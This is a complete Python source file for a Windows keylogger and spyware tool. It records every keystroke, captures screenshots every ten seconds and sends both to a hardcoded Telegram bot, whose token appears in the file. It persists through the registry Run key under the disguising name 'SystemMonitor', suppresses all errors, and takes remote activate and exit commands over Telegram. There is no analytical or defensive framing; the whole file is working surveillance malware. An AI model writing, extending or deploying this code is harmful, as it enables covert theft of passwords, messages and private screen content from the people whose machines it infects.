from pynput import keyboard
from datetime import datetime
import threading
import requests
import os
import time
from PIL import ImageGrab
import winreg
import sys

# ====== CONFIGURATION ======
bot_token = "7566894558:AAFel2H8nBF8r6QuQWI-gTH13NUUBVe_a-I"
chat_id = "8073091127"
log1 = "log1.txt"
log2 = "log2.txt"
ss_file = "screenshot.png"
time_window = 10         # log rotation interval
ss_interval = 10         # screenshot interval
exit_flag = False        # for termination
is_active = False        # keylogger status
active_log = log1        # current log file
lock = threading.Lock()  # to avoid race conditions
key_combo = {keyboard.Key.ctrl_l, keyboard.Key.shift_l, keyboard.KeyCode(char='q')}
current_keys = set()     # for kill switch

# ====== ADD TO STARTUP (Windows Registry) ======

def add_to_startup(script_path=None):
    try:
        if script_path is None:
            script_path = os.path.realpath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        name = "SystemMonitor"  # fake name
        registry = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry, name, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(registry)
    except:
        pass  # silently fail if registry write fails

# ====== SEND TEXT TO TELEGRAM ======
def send_message(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": text}
        )
    except:
        pass

# ====== SEND LOG CONTENT TO TELEGRAM ======
def send_log_content(file_to_send):
    if not os.path.exists(file_to_send):
        return
    try:
        with open(file_to_send, "r") as f:
            log_data = f.read()
        if not log_data.strip():
            return
        for i in range(0, len(log_data), 4000):
            send_message(log_data[i:i+4000])
        os.remove(file_to_send)
    except:
        pass

# ====== ROTATE LOG FILES LOOP ======
def rotate_log():
    global active_log, exit_flag, is_active
    if exit_flag or not is_active:
        return
    with lock:
        prev_log = active_log
        active_log = log2 if active_log == log1 else log1
    threading.Thread(target=send_log_content, args=(prev_log,), daemon=True).start()
    threading.Timer(time_window, rotate_log).start()

# ====== KEYLOGGER HANDLER ======
def on_press(key):
    global exit_flag, is_active
    if not is_active or exit_flag:
        return
    with lock:
        target_log = active_log
    timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S.%f")[:-4]
    try:
        entry = f"{timestamp} - {key.char}\n"
    except AttributeError:
        entry = f"{timestamp} - {key}\n"
    with open(target_log, "a") as f:
        f.write(entry)
    current_keys.add(key)
    if key_combo.issubset(current_keys):
        send_message("[!] Kill switch triggered. Exiting.")
        exit_flag = True
        os._exit(0)

def on_release(key):
    if key in current_keys:
        current_keys.remove(key)

# ====== SCREENSHOT LOOP ======
def take_screenshot():
    global exit_flag, is_active
    if exit_flag or not is_active:
        return
    try:
        img = ImageGrab.grab()
        img.save(ss_file)
        with open(ss_file, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendDocument",
                data={"chat_id": chat_id},
                files={"document": f}
            )
        os.remove(ss_file)
    except:
        pass
    threading.Timer(ss_interval, take_screenshot).start()

# ====== TELEGRAM COMMAND WATCHER ======
def watch_telegram():
    global exit_flag, is_active
    last_update_id = None
    while not exit_flag:
        try:
            url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
            if last_update_id:
                url += f"?offset={last_update_id + 1}"
            res = requests.get(url).json()
            for update in res.get("result", []):
                last_update_id = update["update_id"]
                msg = update.get("message", {})
                text = msg.get("text", "")
                sender = msg.get("chat", {}).get("id")
                if sender != int(chat_id):
                    continue
                if text == "/exit":
                    send_message("[!] Remote /exit received. Exiting.")
                    exit_flag = True
                    os._exit(0)
                elif text == "/status":
                    status = "active ✅" if is_active else "inactive ❌"
                    send_message(f"Keylogger is currently *{status}*.")
                elif text == "/activate":
                    if not is_active:
                        is_active = True
                        rotate_log()
                        take_screenshot()
                        send_message("✅ Keylogger activated.")
                    else:
                        send_message("Keylogger is already running.")
                elif text == "/deactivate":
                    if is_active:
                        is_active = False
                        send_message("⏸️ Keylogger deactivated.")
                    else:
                        send_message("Keylogger is already inactive.")
        except:
            pass
        time.sleep(3)

# ====== MAIN START ======
if __name__ == "__main__":
    add_to_startup()  # Add to Windows Registry
    threading.Thread(target=watch_telegram, daemon=True).start()
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()
